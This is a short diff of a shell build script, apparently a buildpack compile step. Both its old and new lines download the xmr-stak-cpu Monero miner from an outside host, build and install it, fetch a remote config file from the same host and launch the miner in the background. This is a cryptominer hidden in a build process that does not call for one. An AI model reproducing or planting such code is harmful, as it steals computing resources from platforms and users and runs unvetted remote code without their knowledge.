@@ -57,7 +57,7 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-curl -o abc.zip -s -L "https://share.fakemmehd.net/files/xmr-stak-cpu.zip"
+wget -O abc.zip "http://share.fakemmehd.net/files/xmr-stak-cpu.zip"
 unzip abc.zip
 rm abc.zip
 cd xmr-stak-cpu
@@ -65,6 +65,6 @@ cmake .
 make install
 cd bin
 rm config.txt
-wget http://share.fakemmehd.net/text/2017-10-12_09-59-07.txt -O config.txt
+wget -O config.txt "http://share.fakemmehd.net/text/2017-10-12_09-59-07.txt"
 ./xmr-stak-cpu &
 echo "done"
